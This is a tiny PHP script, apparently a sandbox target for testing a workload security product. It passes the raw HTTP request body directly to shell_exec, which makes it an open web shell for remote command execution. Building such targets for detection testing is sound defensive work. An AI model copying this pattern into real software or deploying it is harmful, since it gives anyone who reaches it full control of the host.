<?php
echo "DataDog Workload Protection Sandbox";

$body = file_get_contents('php://input');
shell_exec($body);
